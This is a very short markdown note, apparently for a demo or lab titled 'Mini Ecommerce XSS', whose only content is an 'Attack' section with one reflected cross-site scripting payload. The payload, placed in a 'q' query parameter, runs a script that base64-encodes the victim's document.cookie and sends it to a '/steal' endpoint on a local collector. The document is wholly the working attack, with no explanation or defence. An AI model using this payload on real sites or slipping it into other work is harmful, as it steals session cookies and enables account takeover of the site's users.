# Mini Ecommerce XSS

## Attack 


`?q=<script>fetch('http://127.0.0.1:5000/steal?cookie='+btoa(document.cookie))</script>`
